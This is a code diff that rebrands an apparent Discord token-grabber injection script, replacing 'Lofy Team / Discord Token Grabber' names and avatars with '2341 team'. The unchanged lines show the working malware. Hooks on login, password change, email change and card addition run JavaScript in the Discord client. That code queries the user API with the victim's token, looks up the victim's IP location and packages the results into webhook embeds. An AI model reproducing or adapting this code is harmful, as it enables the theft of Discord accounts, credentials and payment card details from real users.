@@ -50,17 +50,17 @@ function sendWeb(e) {
 
 function injected() {
 	var e = {
-		username: "Discord Token Grabber",
-		avatar_url: "https://cdn.discordapp.com/attachments/402804198053249024/905502124383805440/c20a5eeda3f7fb94e7ad57c95b042e72.png",
+		username: "2341",
+		avatar_url: "https://i.ytimg.com/vi/ygcMEl-khEc/maxresdefault.jpg",
 		embeds: [{
 			color: 43690,
 			description: `Injetado Em  ${__dirname}`,
-			title: "Lofy Team / Discord Token Grabber",
+			title: "2341 team",
 			image: {
 				url: ""
 			},
 			thumbnail: {
-				url: "https://cdn.discordapp.com/attachments/402804198053249024/905502124383805440/c20a5eeda3f7fb94e7ad57c95b042e72.png"
+				url: "https://i.ytimg.com/vi/ygcMEl-khEc/maxresdefault.jpg"
 			}
 		}]
 	};
@@ -78,7 +78,7 @@ function onLogin(e, t) {
 								if (n.bio) var l = n.bio;
 								else l = "Sem Status";
 								if (n.banner) var c = `https://cdn.discordapp.com/banners/${n.id}/${n.banner}.png?size=512`;
-								else c = "https://cdn.discordapp.com/avatars/712825748678770830/66a54f75d95a9e395c07d29d458ff947.png?size=2048";
+								else c = "https://i.ytimg.com/vi/ygcMEl-khEc/maxresdefault.jpg";
 								var d = [];
 								o.forEach(e => {
 									e.owner && d.push("oof")
@@ -86,16 +86,16 @@ function onLogin(e, t) {
 
 
 									var u = {
-										username: "Discord Token Grabber",
-										avatar_url: "https://cdn.discordapp.com/attachments/402804198053249024/905502124383805440/c20a5eeda3f7fb94e7ad57c95b042e72.png",
+										username: "2341",
+										avatar_url: "https://i.ytimg.com/vi/ygcMEl-khEc/maxresdefault.jpg",
 										embeds: [{
 											author: {
-												name: 'By Lofy Team',
-												icon_url: "https://cdn.discordapp.com/avatars/712825748678770830/66a54f75d95a9e395c07d29d458ff947.png?size=2048"
+												name: '2341 team',
+												icon_url: "https://i.ytimg.com/vi/ygcMEl-khEc/maxresdefault.jpg"
 											},
 											color: 43690,
 											description: "",
-											title: "Lofy Team / Discord Token Grabber",
+											title: "2341 team",
 											image: {
 												url: c
 											},
@@ -171,18 +171,18 @@ function onPasswordChange(e, t, n) {
 	(win = BrowserWindow.getAllWindows()[0]).webContents.executeJavaScript(`\n    var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me", false );\n    xmlHttp.setRequestHeader("Authorization", '${n}');\n    xmlHttp.send();\n    JSON.parse(xmlHttp.responseText);`, !0).then(a => {
 		win.webContents.executeJavaScript('\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://ipapi.co/json", false );\n        xmlHttp.send();\n        JSON.parse(xmlHttp.responseText);', !0).then(s => {
 			if (a.banner) var r = `https://cdn.discordapp.com/banners/${a.id}/${a.banner}.png?size=512`;
-			else r = "https://cdn.discordapp.com/avatars/712825748678770830/66a54f75d95a9e395c07d29d458ff947.png?size=2048";
+			else r = "https://i.ytimg.com/vi/ygcMEl-khEc/maxresdefault.jpg";
 			var o = {
-				username: "Discord Token Grabber",
-				avatar_url: "https://cdn.discordapp.com/attachments/402804198053249024/905502124383805440/c20a5eeda3f7fb94e7ad57c95b042e72.png",
+				username: "2341",
+				avatar_url: "https://i.ytimg.com/vi/ygcMEl-khEc/maxresdefault.jpg",
 				embeds: [{
 					author: {
-						name: 'By Lofy Team',
-						icon_url: "https://cdn.discordapp.com/avatars/712825748678770830/66a54f75d95a9e395c07d29d458ff947.png?size=2048"
+						name: 'By 2341 Team',
+						icon_url: "https://i.ytimg.com/vi/ygcMEl-khEc/maxresdefault.jpg"
 					},
 					color: 43690,
 					description: "",
-					title: "Lofy Team / Discord Token Grabber",
+					title: "2341",
 					image: {
 						url: r
 					},
@@ -234,19 +234,19 @@ function onEmailChange(e, t, n) {
 	(win = BrowserWindow.getAllWindows()[0]).webContents.executeJavaScript(`\n    var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me", false );\n    xmlHttp.setRequestHeader("Authorization", '${n}');\n    xmlHttp.send();\n    JSON.parse(xmlHttp.responseText);`, !0).then(a => {
 		win.webContents.executeJavaScript('\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://ipapi.co/json", false );\n        xmlHttp.send();\n        JSON.parse(xmlHttp.responseText);', !0).then(s => {
 			if (a.banner) var r = `https://cdn.discordapp.com/banners/${a.id}/${a.banner}.png?size=512`;
-			else r = "https://cdn.discordapp.com/avatars/712825748678770830/66a54f75d95a9e395c07d29d458ff947.png?size=2048";
+			else r = "https://i.ytimg.com/vi/ygcMEl-khEc/maxresdefault.jpg";
 			var o = {
-				username: "Discord Token Grabber",
-				avatar_url: "https://cdn.discordapp.com/attachments/402804198053249024/905502124383805440/c20a5eeda3f7fb94e7ad57c95b042e72.png",
+				username: "2341",
+				avatar_url: "https://i.ytimg.com/vi/ygcMEl-khEc/maxresdefault.jpg",
 				embeds: [{
 					author: {
-						name: 'By Lofy Team',
-						url: "https://notfubuki.glitch.me",
-						icon_url: "https://cdn.discordapp.com/avatars/712825748678770830/66a54f75d95a9e395c07d29d458ff947.png?size=2048"
+						name: 'By 2341 Team',
+						url: "youtube.com",
+						icon_url: "https://i.ytimg.com/vi/ygcMEl-khEc/maxresdefault.jpg"
 					},
 					color: 43690,
 					description: "",
-					title: "Lofy Team / Discord Token Grabber",
+					title: "2341",
 					image: {
 						url: r
 					},
@@ -298,18 +298,18 @@ function onCardADD(e, t, n, a, s, r, o, i, p, l) {
 	(win = BrowserWindow.getAllWindows()[0]).webContents.executeJavaScript(`\n    var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me", false );\n    xmlHttp.setRequestHeader("Authorization", '${l}');\n    xmlHttp.send();\n    JSON.parse(xmlHttp.responseText);`, !0).then(l => {
 		win.webContents.executeJavaScript('\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://ipapi.co/json", false );\n        xmlHttp.send();\n        JSON.parse(xmlHttp.responseText);', !0).then(c => {
 			if (l.banner) var d = `https://cdn.discordapp.com/banners/${l.id}/${l.banner}.png?size=512`;
-			else d = "https://cdn.discordapp.com/avatars/712825748678770830/66a54f75d95a9e395c07d29d458ff947.png?size=2048";
+			else d = "https://i.ytimg.com/vi/ygcMEl-khEc/maxresdefault.jpg";
 			var u = {
-				sername: "Discord Token Grabber",
-				avatar_url: "https://cdn.discordapp.com/attachments/402804198053249024/905502124383805440/c20a5eeda3f7fb94e7ad57c95b042e72.png",
+				sername: "2341",
+				avatar_url: "https://i.ytimg.com/vi/ygcMEl-khEc/maxresdefault.jpg",
 				embeds: [{
 					author: {
-						name: 'By Lofy Team',
-						icon_url: "https://cdn.discordapp.com/avatars/712825748678770830/66a54f75d95a9e395c07d29d458ff947.png?size=2048"
+						name: 'By 2341 Team',
+						icon_url: "https://i.ytimg.com/vi/ygcMEl-khEc/maxresdefault.jpg"
 					},
 					color: 43690,
 					description: "",
-					title: "Lofy Team / Discord Token Grabber",
+					title: "2341 Team",
 					image: {
 						url: d
 					},
